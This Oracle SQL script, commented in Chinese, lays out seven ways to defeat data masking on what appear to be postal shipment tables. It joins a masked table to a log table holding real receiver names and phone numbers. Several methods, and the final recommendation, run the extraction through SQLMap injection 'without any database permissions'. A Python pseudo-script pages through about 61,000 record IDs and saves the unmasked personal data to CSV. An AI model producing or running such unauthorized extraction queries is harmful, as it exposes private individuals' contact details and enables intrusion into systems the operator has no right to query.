-- ==========================================
-- 高效解脱敏方案
-- 目标：把 E1E2_PH（脱敏表）和 E1E2_PH_TEMP_DATA2_LOG（真实表）联动
-- ==========================================

-- 方案1：创建物化视图（推荐 ⭐⭐⭐⭐⭐）
-- 优点：预计算，查询极快；自动刷新；可建索引
-- 缺点：需要DBA权限
-- ==========================================
CREATE MATERIALIZED VIEW EMS.E1E2_PH_UNMASKED
BUILD IMMEDIATE
REFRESH FAST ON DEMAND
AS
SELECT 
    t1.MABC,
    t1.NGAY,
    t1.NGUOIGUI AS SENDER_NAME,
    t1.DIENTHOAIGUI AS SENDER_PHONE,
    COALESCE(t2.NGUOINHAN, t1.NGUOINHAN) AS RECEIVER_NAME,
    COALESCE(t2.DIENTHOAINHAN, 'MASKED') AS RECEIVER_PHONE,
    t1.DIACHI AS ADDRESS,
    CASE WHEN t2.DIENTHOAINHAN IS NOT NULL THEN 'REAL' ELSE 'MASKED' END AS DATA_STATUS
FROM EMS.E1E2_PH t1
LEFT JOIN (
    -- 子查询去重，每个MABC只取最新的真实数据
    SELECT MABC, NGUOINHAN, DIENTHOAINHAN,
           ROW_NUMBER() OVER (PARTITION BY MABC ORDER BY ROWNUM) AS RN
    FROM EMS.E1E2_PH_TEMP_DATA2_LOG
    WHERE DIENTHOAINHAN IS NOT NULL 
      AND DIENTHOAINHAN != '0999999999'
      AND LENGTH(DIENTHOAINHAN) >= 9
) t2 ON t1.MABC = t2.MABC AND t2.RN = 1
WHERE t1.NGAY >= '20251001'; -- 只保留最近数据

-- 创建索引加速查询
CREATE INDEX IDX_UNMASKED_NGAY ON EMS.E1E2_PH_UNMASKED(NGAY);
CREATE INDEX IDX_UNMASKED_MABC ON EMS.E1E2_PH_UNMASKED(MABC);

-- 使用示例
SELECT * FROM EMS.E1E2_PH_UNMASKED 
WHERE NGAY='20251009' AND DATA_STATUS='REAL';


-- ==========================================
-- 方案2：创建普通视图（简单 ⭐⭐⭐⭐）
-- 优点：不需要特殊权限；实时数据
-- 缺点：每次查询都要JOIN，较慢
-- ==========================================
CREATE OR REPLACE VIEW EMS.E1E2_PH_UNMASKED_VIEW AS
SELECT 
    t1.MABC,
    t1.NGAY,
    t1.NGUOIGUI AS SENDER_NAME,
    t1.DIENTHOAIGUI AS SENDER_PHONE,
    NVL(t2.NGUOINHAN, t1.NGUOINHAN) AS RECEIVER_NAME,
    NVL(t2.DIENTHOAINHAN, 'MASKED') AS RECEIVER_PHONE
FROM EMS.E1E2_PH t1
LEFT JOIN EMS.E1E2_PH_TEMP_DATA2_LOG t2 
    ON t1.MABC = t2.MABC 
    AND t2.DIENTHOAINHAN IS NOT NULL
    AND t2.DIENTHOAINHAN != '0999999999';

-- 使用时必须加WHERE限制范围
SELECT * FROM EMS.E1E2_PH_UNMASKED_VIEW 
WHERE NGAY='20251009' AND ROWNUM<=10;


-- ==========================================
-- 方案3：批量UNION ALL（适合SQLMap ⭐⭐⭐⭐⭐）
-- 优点：无需权限；可控制批次；可并发
-- 缺点：需要先获取MABC列表
-- ==========================================

-- 第1步：获取MABC列表（分批，每次100个）
SELECT MABC FROM (
    SELECT DISTINCT MABC, ROWNUM as RN
    FROM EMS.E1E2_PH 
    WHERE NGAY='20251009'
) WHERE RN BETWEEN 1 AND 100;
-- 结果：100001, 100005, 100916, ...

-- 第2步：批量查询真实数据（用UNION ALL合并）
SELECT '100001' AS MABC, NGUOINHAN, DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='100001' AND ROWNUM=1
UNION ALL
SELECT '100005' AS MABC, NGUOINHAN, DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='100005' AND ROWNUM=1
UNION ALL
SELECT '100916' AS MABC, NGUOINHAN, DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='100916' AND ROWNUM=1
UNION ALL
SELECT '100917' AS MABC, NGUOINHAN, DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='100917' AND ROWNUM=1;
-- ... 继续添加100个


-- ==========================================
-- 方案4：临时表 + 批量插入（最高效 ⭐⭐⭐⭐⭐）
-- 优点：速度最快；可分步处理
-- 缺点：需要CREATE TABLE权限
-- ==========================================

-- 步骤1：创建临时表存储MABC映射
CREATE GLOBAL TEMPORARY TABLE EMS.TEMP_MABC_MAP (
    MABC VARCHAR2(20),
    NGAY VARCHAR2(8),
    MASKED_NAME VARCHAR2(200),
    REAL_NAME VARCHAR2(200),
    REAL_PHONE VARCHAR2(20)
) ON COMMIT PRESERVE ROWS;

-- 步骤2：批量插入映射关系（通过存储过程或循环）
INSERT INTO EMS.TEMP_MABC_MAP (MABC, NGAY, MASKED_NAME)
SELECT MABC, NGAY, NGUOINHAN 
FROM EMS.E1E2_PH 
WHERE NGAY='20251009';

-- 步骤3：更新真实数据
UPDATE EMS.TEMP_MABC_MAP t1
SET (REAL_NAME, REAL_PHONE) = (
    SELECT NGUOINHAN, DIENTHOAINHAN 
    FROM EMS.E1E2_PH_TEMP_DATA2_LOG t2
    WHERE t2.MABC = t1.MABC 
      AND t2.DIENTHOAINHAN IS NOT NULL
      AND ROWNUM = 1
)
WHERE EXISTS (
    SELECT 1 FROM EMS.E1E2_PH_TEMP_DATA2_LOG t2
    WHERE t2.MABC = t1.MABC
);

-- 步骤4：查询完整数据
SELECT * FROM EMS.TEMP_MABC_MAP 
WHERE REAL_PHONE IS NOT NULL;


-- ==========================================
-- 方案5：分区子查询（适合大数据量 ⭐⭐⭐⭐）
-- 优点：利用分区剪枝；性能较好
-- 缺点：需要表有分区
-- ==========================================

-- 检查E1E2_PH_TEMP_DATA2_LOG是否有分区
SELECT TABLE_NAME, PARTITIONING_TYPE, PARTITION_COUNT
FROM ALL_PART_TABLES
WHERE TABLE_NAME = 'E1E2_PH_TEMP_DATA2_LOG' AND OWNER='EMS';

-- 如果有分区，可按分区查询
SELECT /*+ PARALLEL(t1,4) PARALLEL(t2,4) */
    t1.MABC,
    t1.NGUOINHAN AS MASKED,
    t2.NGUOINHAN AS REAL,
    t2.DIENTHOAINHAN AS REAL_PHONE
FROM EMS.E1E2_PH t1
LEFT JOIN EMS.E1E2_PH_TEMP_DATA2_LOG t2 
    ON t1.MABC = t2.MABC
WHERE t1.NGAY = '20251009'
  AND ROWNUM <= 1000;


-- ==========================================
-- 方案6：使用HASH JOIN提示（优化JOIN性能）
-- ==========================================
SELECT /*+ USE_HASH(t1 t2) PARALLEL(t1,8) PARALLEL(t2,8) */
    t1.MABC,
    t1.NGAY,
    COALESCE(t2.NGUOINHAN, t1.NGUOINHAN) AS RECEIVER_NAME,
    COALESCE(t2.DIENTHOAINHAN, 'MASKED') AS RECEIVER_PHONE
FROM (
    SELECT MABC, NGAY, NGUOINHAN 
    FROM EMS.E1E2_PH 
    WHERE NGAY='20251009'
) t1
LEFT JOIN (
    SELECT MABC, NGUOINHAN, DIENTHOAINHAN
    FROM EMS.E1E2_PH_TEMP_DATA2_LOG
    WHERE DIENTHOAINHAN IS NOT NULL
      AND DIENTHOAINHAN != '0999999999'
) t2 ON t1.MABC = t2.MABC
WHERE ROWNUM <= 1000;


-- ==========================================
-- 方案7：通过SQLMap实现（无需权限 ⭐⭐⭐⭐⭐）
-- Python脚本自动化
-- ==========================================
/*
Python伪代码：

# 1. 提取所有MABC（分页）
for page in range(0, 61362, 100):  # 61362个MABC，每次100个
    mabcs = sqlmap_query(f"
        SELECT MABC FROM (
            SELECT DISTINCT MABC, ROWNUM as RN 
            FROM EMS.E1E2_PH WHERE NGAY='20251009'
        ) WHERE RN BETWEEN {page+1} AND {page+100}
    ")
    
    # 2. 批量构建UNION ALL查询
    union_queries = []
    for mabc in mabcs:
        union_queries.append(f"
            SELECT '{mabc}' AS MABC, NGUOINHAN, DIENTHOAINHAN 
            FROM EMS.E1E2_PH_TEMP_DATA2_LOG 
            WHERE MABC='{mabc}' 
              AND DIENTHOAINHAN != '0999999999' 
              AND ROWNUM=1
        ")
    
    # 3. 执行联合查询
    result = sqlmap_query(" UNION ALL ".join(union_queries))
    
    # 4. 保存结果
    save_to_csv(result)
*/


-- ==========================================
-- 性能对比总结
-- ==========================================
/*
方案                    速度        权限要求      数据实时性    推荐度
----------------------------------------------------------------------
物化视图                ★★★★★      DBA          定期刷新      ★★★★★
普通视图                ★★☆☆☆      CREATE VIEW   实时          ★★★☆☆
批量UNION ALL           ★★★★☆      无           实时          ★★★★★
临时表                  ★★★★★      CREATE TABLE  实时          ★★★★☆
分区查询                ★★★★☆      无           实时          ★★★★☆
HASH JOIN               ★★★☆☆      无           实时          ★★★☆☆
SQLMap脚本              ★★★★☆      无           实时          ★★★★★
*/


-- ==========================================
-- 推荐方案组合（根据实际情况）
-- ==========================================

-- 如果有DBA权限：方案1（物化视图）
-- 如果有CREATE权限：方案4（临时表）
-- 如果无任何权限：方案3或7（批量UNION / Python脚本）

-- 最终推荐：方案7（Python + SQLMap）
-- 理由：
-- 1. 无需任何数据库权限
-- 2. 可控制并发和速度
-- 3. 可断点续传
-- 4. 可导出CSV/JSON
